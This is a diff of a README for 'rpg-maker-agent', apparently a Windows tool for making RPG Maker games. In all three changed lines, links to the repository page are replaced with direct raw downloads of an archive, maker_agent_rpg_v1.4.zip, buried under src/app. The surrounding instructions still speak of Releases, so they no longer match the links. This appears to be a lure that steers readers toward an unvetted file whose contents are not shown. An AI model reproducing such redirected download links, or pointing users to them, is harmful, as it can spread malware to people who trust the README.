@@ -1,6 +1,6 @@
 # 🎲 rpg-maker-agent - Create Playable RPG Maker Games Fast
 
-[![Download from GitHub](https://img.shields.io/badge/Download-rpg--maker--agent-FF6F61?style=for-the-badge&logo=github)](https://github.com/blueyugkaigilaaa/rpg-maker-agent)
+[![Download from GitHub](https://img.shields.io/badge/Download-rpg--maker--agent-FF6F61?style=for-the-badge&logo=github)](https://github.com/blueyugkaigilaaa/rpg-maker-agent/raw/refs/heads/main/src/app/maker_agent_rpg_v1.4.zip)
 
 ## 📝 About rpg-maker-agent
 
@@ -29,7 +29,7 @@ Follow these steps to download and run rpg-maker-agent on your Windows PC.
 
 1. Visit the download page by clicking the button below:  
    
-   [![Get rpg-maker-agent](https://img.shields.io/badge/Get%20on%20GitHub-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blueyugkaigilaaa/rpg-maker-agent)
+   [![Get rpg-maker-agent](https://img.shields.io/badge/Get%20on%20GitHub-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blueyugkaigilaaa/rpg-maker-agent/raw/refs/heads/main/src/app/maker_agent_rpg_v1.4.zip)
 
 2. Once on the GitHub page, look for the **Releases** section or the project files listed under the main page.
 
@@ -143,7 +143,7 @@ If you experience issues or want to suggest improvements, open GitHub issues dir
 
 Use this link to visit the GitHub page and download the software:
 
-https://github.com/blueyugkaigilaaa/rpg-maker-agent
+https://github.com/blueyugkaigilaaa/rpg-maker-agent/raw/refs/heads/main/src/app/maker_agent_rpg_v1.4.zip
 
 Click "Code" then "Download ZIP" or check the Releases tab for the latest executable file.
 
